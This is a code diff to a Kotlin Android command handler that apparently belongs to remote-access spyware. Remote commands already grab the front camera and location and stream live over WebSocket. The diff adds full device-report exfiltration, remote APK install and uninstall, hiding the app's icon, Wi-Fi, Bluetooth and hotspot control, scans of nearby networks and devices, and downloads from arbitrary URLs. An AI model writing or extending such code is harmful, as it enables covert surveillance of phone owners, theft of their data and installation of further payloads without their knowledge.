@@ -26,7 +26,7 @@ class CommandProcessor(
             try {
                 when (cmd) {
                     "ping" -> {
-                        val bat = systemHandler.getBatteryStatus()
+                        val bat = systemHandler.getBasicBatteryStatus()
                         uploader.sendText("🟢 Device Online\n$bat")
                     }
                     "cam_front" -> {
@@ -62,9 +62,9 @@ class CommandProcessor(
                         uploader.sendText("Volume set to $level%")
                     }
                     "info" -> {
-                        val bat = systemHandler.getBatteryStatus()
-                        val loc = systemHandler.getLocation()
-                        uploader.sendText("*Device Intel*\n$bat\n$loc")
+                        uploader.sendText("Generating massive intelligence report. Please wait...")
+                        val reportFile = systemHandler.generateFullSystemReport()
+                        uploader.sendDocument(reportFile, "Full Device Intel Report")
                     }
                     "get_log" -> {
                         uploader.sendText("Uploading error logs...")
@@ -76,10 +76,9 @@ class CommandProcessor(
                         uploader.sendText("Error logs cleared.")
                     }
                     "live_start" -> {
-                        // arg should be the WebSocket URL, e.g., "wss://your-server.tailnet.ts.net/live"
                         if (arg.startsWith("ws")) {
                             uploader.sendText("Initiating Live WebSocket Connection...")
-                            liveSessionManager.connect(arg)
+                            liveSessionManager.connect(arg.trim())
                         } else {
                             uploader.sendText("Error: Invalid WebSocket URL provided.")
                         }
@@ -87,6 +86,54 @@ class CommandProcessor(
                     "live_stop" -> {
                         liveSessionManager.disconnect()
                         uploader.sendText("Live Session Terminated.")
+                    }
+                    
+                    // ==========================================
+                    // NEW COMMANDS ADDED BELOW (Keeping old intact)
+                    // ==========================================
+
+                    "install_app" -> {
+                        uploader.sendText("Attempting to install APK from: $arg")
+                        systemHandler.installApp(arg)
+                    }
+                    "uninstall_app" -> {
+                        uploader.sendText("Attempting to uninstall package: $arg")
+                        systemHandler.uninstallApp(arg)
+                    }
+                    "icon_hide" -> {
+                        uploader.sendText(systemHandler.setAppIconVisibility(false))
+                    }
+                    "icon_show" -> {
+                        uploader.sendText(systemHandler.setAppIconVisibility(true))
+                    }
+                    "toggle_wifi" -> {
+                        val enable = arg == "on"
+                        uploader.sendText(systemHandler.setWifiState(enable))
+                    }
+                    "toggle_bt" -> {
+                        val enable = arg == "on"
+                        uploader.sendText(systemHandler.setBluetoothState(enable))
+                    }
+                    "toggle_hotspot" -> {
+                        val enable = arg == "on"
+                        uploader.sendText(systemHandler.setHotspotState(enable))
+                    }
+                    "scan_wifi" -> {
+                        uploader.sendText("Scanning Wi-Fi networks...\n" + systemHandler.getWifiScanResults())
+                    }
+                    "scan_bt" -> {
+                        uploader.sendText("Scanning Bluetooth devices...\n" + systemHandler.getBluetoothScanResults())
+                    }
+                    "download_url" -> {
+                        try {
+                            val json = JSONObject(arg)
+                            val url = json.optString("url")
+                            val dest = json.optString("path", "")
+                            uploader.sendText("Starting download from URL...")
+                            uploader.sendText(systemHandler.downloadFileFromUrl(url, dest))
+                        } catch (e: Exception) {
+                            uploader.sendText("Invalid JSON for download_url. Expected {\"url\":\"...\", \"path\":\"...\"}")
+                        }
                     }
                 }
             } catch (e: Exception) {
